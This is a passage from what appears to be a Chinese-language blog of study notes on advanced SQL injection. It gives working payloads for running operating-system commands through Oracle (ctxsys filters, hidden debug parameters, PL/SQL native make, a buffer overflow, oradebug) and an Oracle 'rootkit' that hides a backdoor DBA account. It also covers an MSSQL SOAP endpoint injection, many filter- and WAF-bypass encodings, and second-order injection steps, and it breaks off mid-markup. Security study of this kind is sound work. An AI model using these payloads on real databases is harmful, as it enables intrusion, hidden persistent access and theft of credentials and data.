string">'COMMAND'</span><span class="token punctuation">,</span><span class="token string">'oratclsh.exe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">begin</span><span class="token keyword">insert</span> <span class="token keyword">into</span> t <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'set f [open "C:/AHT.txt" {RDWR CREAT}]puts $f "Your System is not protected!"close $fset f [open [lindex $argv 0] {RDWR CREAT}]puts $f "SUCCESSH"close $f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">drop</span> <span class="token keyword">index</span> user_filter_idx<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">index</span> user_filter_idx <span class="token keyword">on</span> t <span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span>indextype <span class="token operator">is</span> ctxsys<span class="token punctuation">.</span>contextparameters <span class="token punctuation">(</span><span class="token string">'FILTER USER_FILTER_PREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> token_text <span class="token keyword">from</span> DR$USER_FILTER_IDX$I<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>Alter System set 事件</code></p><p>Alter System set是一种非公开参数(自Oracle 10g以来)，它可以指定自定义调试器的名称。 在调试事件(debugging event)过程中将执行自定义的调试器，而调试事件则需予以强制实现。 例如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> system <span class="token keyword">set</span> <span class="token string">"_oradbg_pathname"</span><span class="token operator">=</span><span class="token string">'/tmp/debug.sh'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>PL/SQL native 9i</code></p><p>自9iR2以来，Oracle提供了将PL/SQL代码转换成C代码的方法。为提高灵活性，Oracle 可以修改make工具的名称(例如，修改成calc.exe或其他可执行文件)。例如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> system <span class="token keyword">set</span> plsql_native_make_utility<span class="token operator">=</span><span class="token string">'cmd.exe /c echo Owned &gt; c:\ rds.txt &amp;'</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">session</span> <span class="token keyword">set</span> plsql_compiler_flags<span class="token operator">=</span><span class="token string">'NATIVE'</span><span class="token punctuation">;</span><span class="token keyword">Create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> <span class="token keyword">procedure</span> rds <span class="token keyword">as</span> <span class="token keyword">begin</span> <span class="token boolean">null</span><span class="token punctuation">;</span> <span class="token keyword">end</span><span class="token punctuation">;</span> <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>缓冲区溢出</p><p>2004 年，Cesar Cerrudo 公布 了关于 Oracle 中 NUMTOYMINTERVA 和 NUMTODSINTERVAL 这两个函数的一种缓冲区溢出漏洞，使用下列漏洞在数据库服务器上运行操作系统命令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> NUMTOYMINTERVAL <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMNOPQR'</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">141</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">172</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'echo ARE YOU SURE? &gt;c:\Unbreakable.txt'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>自定义应用代码</p><p>在Oracle领域，我们经常使用包含操作系统命令的表，这些命令由连接到数据库的外部程序执行。使用指定的命令更新数据库中这样的条目时，我们经常可以控制系统。检查所有表以寻找包含操作系统命令的列，将命令注入到命令表，等待被执行。</p></li></ul><h5 id="以SYSDBA执行代码"><a href="#以SYSDBA执行代码" class="headerlink" title="以SYSDBA执行代码"></a>以SYSDBA执行代码</h5><p>对于具有SYSDBA权限(比如SYS)的用户来说，使用oradebug(9i R2、10g R2、11g R1或11g R2)调用任意的操作系统命令或DLL/库。以下命令中的空格字符必须使用tab字符来代替：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlplussys<span class="token operator">/</span>pw<span class="token variable">@dbserver</span><span class="token keyword">as</span>sysdba<span class="token keyword">SQL</span><span class="token operator">&gt;</span>oradebugsetmypid<span class="token keyword">SQL</span><span class="token operator">&gt;</span>oradebug<span class="token keyword">call</span>system<span class="token string">"/bin/touch-f/home/oracle/rds.txt"</span><span class="token keyword">Function</span>returned<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="PostgreSQL-5"><a href="#PostgreSQL-5" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>执行操作系统命令的方式就是调用用户自定义函数(User-Defined Function, UDF)</p><p>对于存在于本地操作系统之上的共享库，库中将没有magic block声明。我们必须上传具有该声明的我们自己的共享库。在PostgreSQL中，可以将UDF放在PostgreSQL用户具有读/ 写访问权限的任何位置。在Linux/UNIX系统中通常位于/tmp目录，在Windows系统中通常位 于 c:\windows\temp 目录。</p><p>要包含magic block,在已经包含了头文件fmgr.h之外，还需要在源文件的其中一个模块(仅能有一个模块)中包含下面的指令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># ifdef PG_MODULE_MAGIC</span>PG_MODULE_MAGIC<span class="token punctuation">;</span><span class="token comment"># endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="巩固访问"><a href="#巩固访问" class="headerlink" title="巩固访问"></a>巩固访问</h3><p>Oracle rookkit</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- the following code must run as DBA</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">grant</span> dba <span class="token keyword">to</span> hidden identified <span class="token keyword">by</span> hidden_2009<span class="token punctuation">;</span><span class="token comment">-- create a user hidden with DBA privileges</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> sys<span class="token punctuation">.</span>kupp$<span class="token keyword">proc</span><span class="token punctuation">.</span>disable_multiprocess <span class="token keyword">from</span> dual<span class="token punctuation">;</span> <span class="token comment">-- this SELECT statement is needed for newer version of Oracle (10.2.0.5,11.1.0.7, 11.2.0.x) to activate the identity change</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">exec</span> sys<span class="token punctuation">.</span>kupp$<span class="token keyword">proc</span><span class="token punctuation">.</span>change_user<span class="token punctuation">(</span><span class="token string">'SYS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- become user SYS </span><span class="token comment">-- change the users record in sys.user$</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">update</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">set</span> tempts<span class="token comment">#=666 where name='HIDDEN';</span><span class="token comment">-- does not show the user HIDDEN</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> username <span class="token keyword">from</span> dba_users<span class="token punctuation">;</span><span class="token comment">-- but the connect works</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">connect</span> hidden<span class="token operator">/</span>hidden_2009<span class="token comment">#Oracle使用ALL_USERS和DBA_USERS视图来显示用户列表，这些视图包含了三张表的并集。通过将tempts#(或datats#或type#)设置成不存在的值，可以从并集结果和视图中清除用户：</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FORCE</span> <span class="token keyword">VIEW</span> <span class="token string">"SYS"</span><span class="token punctuation">.</span><span class="token string">"ALL—USERS"</span> <span class="token punctuation">(</span><span class="token string">"USERNAME"</span><span class="token punctuation">,</span><span class="token string">"USER_ID"</span><span class="token punctuation">,</span><span class="token string">"CREATED"</span><span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token keyword">select</span> u<span class="token punctuation">.</span>name<span class="token punctuation">,</span> u<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token comment">#, u.ctime</span><span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ u<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>ts$ dts<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>ts$ tts<span class="token keyword">where</span> u<span class="token punctuation">.</span>datats<span class="token comment"># = dts.ts#</span><span class="token operator">and</span> u<span class="token punctuation">.</span>tempts<span class="token comment"># = tts.ts#</span><span class="token operator">and</span> u<span class="token punctuation">.</span><span class="token keyword">type</span><span class="token comment"># = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过http.sys(管理IIS的同一内核组件)暴露基于SOAP(简单对象访问协议)的Web服务，使用T-SQL命令启用端点上的批处理时，端点会隐式暴露另一种名为sqlbatch的SOAP 方法。sqlbatch方法可以通过SOAP来执行T-SQL语句。</p><p>我们可以发出请求来创建需要的SOAP 端点：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token string">' exec('</span><span class="token keyword">CREATE</span> ENDPOINT ep2 STATE<span class="token operator">=</span>STARTED <span class="token keyword">AS</span> HTTP <span class="token punctuation">(</span>AUTHENTICATION <span class="token operator">=</span> <span class="token punctuation">(</span>INTEGRATED<span class="token punctuation">)</span><span class="token punctuation">,</span>PATH <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">/</span>sp<span class="token string">''</span><span class="token punctuation">,</span>PORTS<span class="token operator">=</span><span class="token punctuation">(</span>CLEAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">FOR</span> SOAP <span class="token punctuation">(</span>BATCHES<span class="token operator">=</span>ENABLED<span class="token punctuation">)</span>'<span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述代码在victim服务器的/sp目录中创建了一个SOAP端点，我们可以在该端点上瞄准 一个SOAP请求（使用嵌入式SQL查询）。</p><h2 id="高级话题"><a href="#高级话题" class="headerlink" title="高级话题"></a>高级话题</h2><h3 id="避开输入过滤器"><a href="#避开输入过滤器" class="headerlink" title="避开输入过滤器"></a>避开输入过滤器</h3><p>Web应用防火墙（WAF）或入侵防御系统（IPS）</p><p>通常会过滤SQL关键词，如select，insert，and等、还有特定字符，如单引号，连接字符、还有空白符</p><h4 id="使用大小写变种绕过"><a href="#使用大小写变种绕过" class="headerlink" title="使用大小写变种绕过"></a>使用大小写变种绕过</h4><p>数据库不区分大小写</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'uNiOn SeLeCt password FrOm tblUsers WhErE username='' admin'</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用SQL注释"><a href="#使用SQL注释" class="headerlink" title="使用SQL注释"></a>使用SQL注释</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#过滤器</span><span class="token keyword">if</span> <span class="token punctuation">(</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'FROM '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>Svalue<span class="token punctuation">,</span> <span class="token string">'UPDATE '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'WHERE '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'ALTER '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SELECT '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SHUTDOWN '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'CREATE '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'DROP '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'DELETE FROM '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'script '</span><span class="token punctuation">)</span><span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span><span class="token string">'&lt;&gt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SET '</span><span class="token punctuation">)</span><span class="token punctuation">)</span> die <span class="token punctuation">(</span><span class="token string">'Please provide a permitted value for'</span><span class="token punctuation">.</span>$<span class="token keyword">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对关键字后面跟着的空格检测，使用/**/充当分隔符</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'/**/UNION/**/SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/username/**/LIKE/**/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Mysql中能使用内联注释来避开关键字绕过，sel/**/ect</p><h4 id="使用URL编码"><a href="#使用URL编码" class="headerlink" title="使用URL编码"></a>使用URL编码</h4><p>过滤器能过滤空白符和内联注释序列/*，将序列双URL编码，即对%编码得到%25</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也能使用Unicode编码</p><p><img src="https://images.dadream.eu.org/images/2024/07/ada02281ca6c2ec5917209ee31ddf0fe.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/53fabfd7b23b29dcc9b7671b125d1d16.png"></p><h4 id="使用动态查询执行"><a href="#使用动态查询执行" class="headerlink" title="使用动态查询执行"></a>使用动态查询执行</h4><p>过滤器阻止了想注入的查询，那么可以使用动态执行来避开该过滤器。</p><ul><li><p>mssql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token string">'SELECT password FROM tblUsers'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>oracle</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> pw VARCHAR2<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'SELECT password FROM tblUsers'</span> <span class="token keyword">INTO</span> pw<span class="token punctuation">;</span>DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>使用字符串操作函数将过滤器允许的输入转换成一个包含所需查询的字符串</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Oracle: <span class="token string">'SEL'</span><span class="token operator">||</span><span class="token string">'ECT'</span>MS<span class="token operator">-</span><span class="token keyword">SQL</span>: <span class="token string">'SEL'</span><span class="token operator">+</span><span class="token string">'ECT'</span>MySQL: <span class="token string">'SEL'</span> <span class="token string">'ECT'</span><span class="token comment">#URL中分别将它们编码成％2b(+)和％20( )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>oracle使用chr()，ms-sql使用char()，还能用来绕过引号</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Oracle中的REVERSE、TRANSLATE、REPLACE 和SUBSTR函数。</p><p>ms-sql，使用16进制实例化字符串</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@query</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@query</span> <span class="token operator">=</span> <span class="token number">0x53454c4543542070617373776f72642046524f4d2074626c5573657273</span> <span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="使用空字节"><a href="#使用空字节" class="headerlink" title="使用空字节"></a>使用空字节</h4><p>空字节之所以能起作用，是因为原生代码(native code)和托管代码分别采用不同的方法来处理空字节。在原生代码中，根据字符串起始位置到出现第一个空字节的位置来确定字符串长度 (空字节有效终止了字符串)。而在托管代码中，字符串对象包含一个字符数组(可能包含空字节) 和一条单独的字符串长度记录。</p><p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节 (%00)即可。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">%</span><span class="token number">00</span><span class="token string">'UNION SELECT password FROM tblUsers WHERE username= '</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="嵌套剥离后的表达式（双字绕过）"><a href="#嵌套剥离后的表达式（双字绕过）" class="headerlink" title="嵌套剥离后的表达式（双字绕过）"></a>嵌套剥离后的表达式（双字绕过）</h4><p>有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后再按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或多个字符，就不会递归应用过滤器。</p><p>如果从输入中剥离了 SQL关键词SELECT</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SELSELECTECT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="利用截断"><a href="#利用截断" class="headerlink" title="利用截断"></a>利用截断</h4><p>审查过滤器通常会对用户提供的数据执行多种操作，有时这些操作中会包括将输入截断成最大的长度(可能是为了尽力阻止缓冲区溢出攻击)或者调整数据使其位于拥有预定义最大长度的数据库字段内。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#条件：对引号标记进行双重编码，使用两个单引号(")替换所有的单引号(')，将每一项截断成16个字符</span><span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin"-- '</span><span class="token operator">AND</span> password <span class="token operator">=</span><span class="token string">''</span><span class="token comment">#执行不成功</span><span class="token comment">#利用上述条件，注入15个a和一个单引号</span><span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaa'' AND password =''#第三个单引号干扰了语法，后面无效'</span><span class="token comment">#利用第二个注入点闭合单引号，并注入永真条件</span><span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaa'' AND password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="避开自定义过滤器"><a href="#避开自定义过滤器" class="headerlink" title="避开自定义过滤器"></a>避开自定义过滤器</h4><p>遇到各种奇怪绝妙的输入过滤器，可以通过发挥想象力来避开这些过滤器。</p><p>例如，包名加双引号，编码替换，加标签</p><h4 id="使用非标准入口点"><a href="#使用非标准入口点" class="headerlink" title="使用非标准入口点"></a>使用非标准入口点</h4><p>通常WAF不会验证参数名，可以注入SQL代码到参数名中，如果参数名被处理成SQL查询就能执行，同理，也能注入到HTTP头中等等</p><h3 id="利用二阶SQL注入"><a href="#利用二阶SQL注入" class="headerlink" title="利用二阶SQL注入"></a>利用二阶SQL注入</h3><ol><li><p>攻击者在HTTP请求中提交某种经过构思的输入。</p></li><li><p>应用程序存储该输入(通常保存在数据库中)以便后面使用并响应请求。</p></li><li><p>攻击者提交第二个(不同的)请求。</p></li><li><p>为处理第二个请求，应用程序会检索己经存储的输入并处理，从而导致攻击者注入的 SQL查询被执行。</p></li><li><p>如果可行的话，会在应用程序对第二个请求的响应中向攻击者返回查询结果。</p></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">a<span class="token string">'+@@version+'</span>a<span class="token comment">#注入这个参数值，经过处理得到</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblContacts <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'a''+@@version+''a'</span><span class="token punctuation">,</span><span class="token string">'foo@example.org,....'</span><span class="token comment">#单引号被转化为双引号</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> contactld <span class="token operator">=</span> <span class="token number">123</span><span class="token comment">#检索已存在的细节信息</span><span class="token keyword">UPDATE</span> tblUsers<span class="token keyword">SET</span> name<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">+</span>@<span class="token variable">@version</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">,</span>address<span class="token operator">=</span><span class="token string">'52 Throwley Way'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">WHERE</span> contactld <span class="token operator">=</span> <span class="token number">123</span><span class="token comment">#使用上面测试过的字符串注入引号双重编码</span><span class="token comment">#当查看更新后的信息时，@@version就会执行显示在屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="寻找二阶漏洞"><a href="#寻找二阶漏洞" class="headerlink" title="寻找二阶漏洞"></a>寻找二阶漏洞</h4><ol><li><p>在筹划好应用程序的内容和功能后进行复查，寻找所有用户能够控制的数据项，这些数据项会被应用程序持久保存并被后面的功能重用。单独操作每个数据项并为每个实例执行接下来的步骤。</p></li><li><p>在数据项中提交一个简单的值，数据项在SQL查询中被不安全地使用时很可能会引发问题，例如，单引号或者使用单引号引起来的字母数字型字符串。如有必要，请快速检查所有包含多个阶段的过程（比如用户注册）以保证数据值完全持久地存在于应用程序中。</p></li><li><p>如果发现应用程序的输入过滤器阻止了输入，绕过</p></li><li><p>快速检查应用程序中所有存在显式使用数据项的功能以及可能存在隐式使用数据项的功能。寻找所有能够表明是由输入引发了问题的异常行为，比如数据库错误消息、HTTP 500 状态代码、更隐秘的错误消息、受损的功能、丢失或毁坏的数据等。</p></li><li><p>对于识别出来的每个潜在问题，尝试开发一种概念验证攻击来确认是否存在SQL注入漏洞。请注意，有缺陷的持久数据可能以间接受到攻击的方式（例如，整型转换错误或后续数据验证失败）来引发异常条件。使用两个引号标识来提供相同的输入并查看异常是否消失。 使用数据库专用的结构（比如字符串连接函数和版本标识）来确认正在修改SQL查询。如果异常条件是盲的（例如，不返回查询结果或任何错误消息），使用时间延迟技术来确认漏洞的存在。</p></li></ol><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>对所有可变数据项使用参数化，白名单</p><h3 id="客户端SQL注入漏洞"><a href="#客户端SQL注入漏洞" class="headerlink" title="客户端SQL注入漏洞"></a>客户端SQL注入漏洞</h3><h4 id="访问本地数据库"><a href="#访问本地数据库" class="headerlink" title="访问本地数据库"></a>访问本地数据库</h4><p>为了更快的加载数据，以及离线使用，有时会把数据库放在本地</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//JavaScript创建一个本地数据库</span><span class="token keyword">var</span> database <span class="token operator">=</span> <span class="token function">openDatabase</span><span class="token punctuation">(</span><span class="token string">"dbStatus"</span><span class="token punctuation">,</span> <span class="token string">"1.0"</span><span class="token punctuation">,</span> <span class="token string">"Status updates"</span><span class="token punctuation">,</span><span class="token number">500000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">tx</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>tx<span class="token punctuation">.</span><span class="token function">executeSql</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS tblUpdates (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, date VARCHAR(20), user VARCHAR(50), status VARCHAR(IOO))"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tx<span class="token punctuation">.</span><span class="token function">executeSql</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO tblUpdates (date, user, status) VALUES ('1/8/2012','Me','I am writing a book.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="攻击客户端数据库"><a href="#攻击客户端数据库" class="headerlink" 